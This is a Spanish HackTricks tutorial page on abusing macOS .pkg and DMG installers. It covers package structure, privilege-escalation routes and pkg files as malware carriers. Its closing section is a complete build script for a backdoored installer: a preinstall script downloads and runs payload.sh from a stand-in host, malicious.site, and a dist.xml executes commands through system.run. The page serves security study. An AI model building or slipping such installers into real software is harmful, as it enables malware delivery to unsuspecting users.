# Abuso de Instaladores de macOS

{% hint style="success" %}
Aprende y practica Hacking en AWS:<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">\
Aprende y practica Hacking en GCP: <img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Apoya a HackTricks</summary>

* Revisa los [**planes de suscripción**](https://github.com/sponsors/carlospolop)!
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **síguenos** en **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Comparte trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.

</details>
{% endhint %}

## Información Básica del Paquete

Un **paquete de instalador** de macOS (también conocido como archivo `.pkg`) es un formato de archivo utilizado por macOS para **distribuir software**. Estos archivos son como una **caja que contiene todo lo que una pieza de software** necesita para instalarse y funcionar correctamente.

El archivo del paquete en sí es un archivo comprimido que contiene una **jerarquía de archivos y directorios que se instalarán en la computadora** objetivo. También puede incluir **scripts** para realizar tareas antes y después de la instalación, como configurar archivos de configuración o limpiar versiones antiguas del software.

### Jerarquía

<figure><img src="../../../.gitbook/assets/Pasted Graphic.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption></figcaption></figure>

* **Distribución (xml)**: Personalizaciones (título, texto de bienvenida…) y verificaciones de script/instalación
* **PackageInfo (xml)**: Información, requisitos de instalación, ubicación de instalación, rutas a scripts a ejecutar
* **Lista de materiales (bom)**: Lista de archivos para instalar, actualizar o eliminar con permisos de archivo
* **Carga útil (archivo CPIO comprimido con gzip)**: Archivos para instalar en la `install-location` desde PackageInfo
* **Scripts (archivo CPIO comprimido con gzip)**: Scripts de pre y post instalación y más recursos extraídos a un directorio temporal para su ejecución.

### Descomprimir
```bash
# Tool to directly get the files inside a package
pkgutil —expand "/path/to/package.pkg" "/path/to/out/dir"

# Get the files ina. more manual way
mkdir -p "/path/to/out/dir"
cd "/path/to/out/dir"
xar -xf "/path/to/package.pkg"

# Decompress also the CPIO gzip compressed ones
cat Scripts | gzip -dc | cpio -i
cpio -i < Scripts
```
Para visualizar el contenido del instalador sin descomprimirlo manualmente, también puedes usar la herramienta gratuita [**Suspicious Package**](https://mothersruin.com/software/SuspiciousPackage/).

## Información Básica de DMG

Los archivos DMG, o Imágenes de Disco de Apple, son un formato de archivo utilizado por macOS de Apple para imágenes de disco. Un archivo DMG es esencialmente una **imagen de disco montable** (contiene su propio sistema de archivos) que contiene datos de bloques en bruto, típicamente comprimidos y a veces cifrados. Cuando abres un archivo DMG, macOS **lo monta como si fuera un disco físico**, permitiéndote acceder a su contenido.

{% hint style="danger" %}
Ten en cuenta que los instaladores **`.dmg`** soportan **tantos formatos** que en el pasado algunos de ellos que contenían vulnerabilidades fueron abusados para obtener **ejecución de código en el kernel**.
{% endhint %}

### Jerarquía

<figure><img src="../../../.gitbook/assets/image (225).png" alt=""><figcaption></figcaption></figure>

La jerarquía de un archivo DMG puede ser diferente según el contenido. Sin embargo, para los DMGs de aplicaciones, generalmente sigue esta estructura:

* Nivel Superior: Esta es la raíz de la imagen de disco. A menudo contiene la aplicación y posiblemente un enlace a la carpeta de Aplicaciones.
* Aplicación (.app): Esta es la aplicación real. En macOS, una aplicación es típicamente un paquete que contiene muchos archivos y carpetas individuales que componen la aplicación.
* Enlace de Aplicaciones: Este es un acceso directo a la carpeta de Aplicaciones en macOS. El propósito de esto es facilitarte la instalación de la aplicación. Puedes arrastrar el archivo .app a este acceso directo para instalar la aplicación.

## Privesc a través del abuso de pkg

### Ejecución desde directorios públicos

Si un script de pre o post instalación está, por ejemplo, ejecutándose desde **`/var/tmp/Installerutil`**, un atacante podría controlar ese script para escalar privilegios cada vez que se ejecute. O otro ejemplo similar:

<figure><img src="../../../.gitbook/assets/Pasted Graphic 5.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption><p><a href="https://www.youtube.com/watch?v=kCXhIYtODBg">https://www.youtube.com/watch?v=kCXhIYtODBg</a></p></figcaption></figure>

### AuthorizationExecuteWithPrivileges

Esta es una [función pública](https://developer.apple.com/documentation/security/1540038-authorizationexecutewithprivileg) que varios instaladores y actualizadores llamarán para **ejecutar algo como root**. Esta función acepta la **ruta** del **archivo** a **ejecutar** como parámetro; sin embargo, si un atacante pudiera **modificar** este archivo, podrá **abusar** de su ejecución con root para **escalar privilegios**.
```bash
# Breakpoint in the function to check wich file is loaded
(lldb) b AuthorizationExecuteWithPrivileges
# You could also check FS events to find this missconfig
```
Para más información, consulta esta charla: [https://www.youtube.com/watch?v=lTOItyjTTkw](https://www.youtube.com/watch?v=lTOItyjTTkw)

### Ejecución mediante montaje

Si un instalador escribe en `/tmp/fixedname/bla/bla`, es posible **crear un montaje** sobre `/tmp/fixedname` sin propietarios para que puedas **modificar cualquier archivo durante la instalación** y abusar del proceso de instalación.

Un ejemplo de esto es **CVE-2021-26089** que logró **sobrescribir un script periódico** para obtener ejecución como root. Para más información, echa un vistazo a la charla: [**OBTS v4.0: "Mount(ain) of Bugs" - Csaba Fitzl**](https://www.youtube.com/watch?v=jSYPazD4VcE)

## pkg como malware

### Carga útil vacía

Es posible generar un **`.pkg`** archivo con **scripts de pre y post-instalación** sin ninguna carga útil real aparte del malware dentro de los scripts.

### JS en xml de distribución

Es posible agregar **`<script>`** etiquetas en el **archivo xml de distribución** del paquete y ese código se ejecutará y puede **ejecutar comandos** usando **`system.run`**:

<figure><img src="../../../.gitbook/assets/image (1043).png" alt=""><figcaption></figcaption></figure>

### Instalador con puerta trasera

Instalador malicioso usando un script y código JS dentro de dist.xml
```bash
# Package structure
mkdir -p pkgroot/root/Applications/MyApp
mkdir -p pkgroot/scripts

# Create preinstall scripts
cat > pkgroot/scripts/preinstall <<EOF
#!/bin/bash
echo "Running preinstall script"
curl -o /tmp/payload.sh http://malicious.site/payload.sh
chmod +x /tmp/payload.sh
/tmp/payload.sh
exit 0
EOF

# Build package
pkgbuild --root pkgroot/root --scripts pkgroot/scripts --identifier com.malicious.myapp --version 1.0 myapp.pkg

# Generate the malicious dist.xml
cat > ./dist.xml <<EOF
<?xml version="1.0" encoding="utf-8"?>
<installer-gui-script minSpecVersion="1">
<title>Malicious Installer</title>
<options customize="allow" require-scripts="false"/>
<script>
<![CDATA[
function installationCheck() {
if (system.isSandboxed()) {
my.result.title = "Cannot install in a sandbox.";
my.result.message = "Please run this installer outside of a sandbox.";
return false;
}
return true;
}
function volumeCheck() {
return true;
}
function preflight() {
system.run("/path/to/preinstall");
}
function postflight() {
system.run("/path/to/postinstall");
}
]]>
</script>
<choices-outline>
<line choice="default">
<line choice="myapp"/>
</line>
</choices-outline>
<choice id="myapp" title="MyApp">
<pkg-ref id="com.malicious.myapp"/>
</choice>
<pkg-ref id="com.malicious.myapp" installKBytes="0" auth="root">#myapp.pkg</pkg-ref>
</installer-gui-script>
EOF

# Buil final
productbuild --distribution dist.xml --package-path myapp.pkg final-installer.pkg
```
## Referencias

* [**DEF CON 27 - Desempaquetando Pkgs Una Mirada Dentro de los Paquetes de Instalación de Macos y Fallas de Seguridad Comunes**](https://www.youtube.com/watch?v=iASSG0\_zobQ)
* [**OBTS v4.0: "El Mundo Salvaje de los Instaladores de macOS" - Tony Lambert**](https://www.youtube.com/watch?v=Eow5uNHtmIg)
* [**DEF CON 27 - Desempaquetando Pkgs Una Mirada Dentro de los Paquetes de Instalación de MacOS**](https://www.youtube.com/watch?v=kCXhIYtODBg)
* [https://redteamrecipe.com/macos-red-teaming?utm\_source=pocket\_shared#heading-exploiting-installer-packages](https://redteamrecipe.com/macos-red-teaming?utm\_source=pocket\_shared#heading-exploiting-installer-packages)

{% hint style="success" %}
Aprende y practica Hacking en AWS:<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">\
Aprende y practica Hacking en GCP: <img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Apoya a HackTricks</summary>

* Revisa los [**planes de suscripción**](https://github.com/sponsors/carlospolop)!
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **síguenos** en **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Comparte trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.

</details>
{% endhint %}
